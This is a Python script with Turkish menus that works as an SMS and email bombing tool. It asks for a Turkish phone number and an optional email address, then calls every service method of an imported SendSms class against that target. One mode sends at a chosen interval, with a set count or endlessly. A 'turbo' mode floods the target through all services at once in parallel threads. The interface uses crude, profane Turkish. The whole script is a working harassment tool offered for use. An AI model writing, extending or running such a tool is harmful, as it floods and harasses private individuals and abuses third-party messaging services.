from colorama import Fore, Style, init
from time import sleep
from os import system
from sms import SendSms
import threading

init(autoreset=True)

rainbow_colors = [Fore.RED, Fore.LIGHTRED_EX, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

def animated_rainbow_text(text, delay=0.1, repeat=1):
    for _ in range(repeat):
        system("cls||clear")
        colored = ""
        for i, char in enumerate(text):
            if char.strip() == "":
                colored += char
            else:
                color = rainbow_colors[(i + _) % len(rainbow_colors)]
                colored += color + char
        print(colored + Style.RESET_ALL)
        sleep(delay)

servisler_sms = []
for attribute in dir(SendSms):
    if callable(getattr(SendSms, attribute)) and not attribute.startswith("__"):
        servisler_sms.append(attribute)

while True:
    system("cls||clear")
    banner = """
███████╗███████╗███████╗██████╗  ██████╗ ██╗    ██╗
╚══███╔╝██╔════╝██╔════╝██╔══██╗██╔═══██╗██║    ██║
  ███╔╝ █████╗  █████╗  ██████╔╝██║   ██║██║ █╗ ██║
 ███╔╝  ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║██║███╗██║
███████╗███████╗███████╗██║  ██║╚██████╔╝╚███╔███╔╝
╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝
"""
    animated_rainbow_text(banner, delay=0.12, repeat=5)
    animated_rainbow_text(f"Sms servis sayısı: {len(servisler_sms)}", repeat=2)
    animated_rainbow_text("by @zerowbabaa\n", repeat=1)

    try:
        menu = input("""
1- SMS Gönder (RELAX)
2- SMS Gönder (DEHŞET)
3- SİKTİR GİT
Seçim: """)
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        animated_rainbow_text("Hatalı giriş yaptın nabion aq tekrar dene", repeat=2)
        sleep(2)
        continue

    if menu == 3:
        animated_rainbow_text("SİKTİR OLUP GİDİLİYOR...", repeat=2)
        break

    elif menu in [1, 2]:
        tel_no = input("Telefon numarası (başında +90 olmasın): ")
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            animated_rainbow_text("Hatalı telefon numarası nabion aq tekrar dene", repeat=2)
            sleep(2)
            continue

        mail = input("Mail adresi (bilmiyorsan boş bırak): ")
        if ("@" not in mail or ".com" not in mail) and mail != "":
            animated_rainbow_text("Hatalı mail adresi nabion aq tekrar dene", repeat=2)
            sleep(2)
            continue

        if menu == 1:
            try:
                kere = input("Kaç adet SMS göndermek istiyon kral (sonsuz için boş bırak): ")
                kere = int(kere) if kere else None
            except ValueError:
                animated_rainbow_text("Hatalı giriş yaptın nabion aq tekrar dene", repeat=2)
                sleep(2)
                continue

            try:
                aralik = int(input("Kaç saniye aralıkla göndermek istiyorsun kral: "))
            except ValueError:
                animated_rainbow_text("Hatalı giriş yaptın nabion aq tekrar dene", repeat=2)
                sleep(2)
                continue

            sms = SendSms(tel_no, mail)
            if kere is None:
                while True:
                    for fonk in servisler_sms:
                        getattr(sms, fonk)()
                        sleep(aralik)
            else:
                while sms.adet < kere:
                    for fonk in servisler_sms:
                        if sms.adet >= kere:
                            break
                        getattr(sms, fonk)()
                        sleep(aralik)
        else:
            send_sms = SendSms(tel_no, mail)
            dur = threading.Event()
            def turbo():
                while not dur.is_set():
                    threads = []
                    for fonk in servisler_sms:
                        t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                        threads.append(t)
                        t.start()
                    for t in threads:
                        t.join()

            try:
                turbo()
            except KeyboardInterrupt:
                dur.set()
                animated_rainbow_text("Ctrl+C algılandı. Menüye dönülüyor...", repeat=2)
                sleep(2)
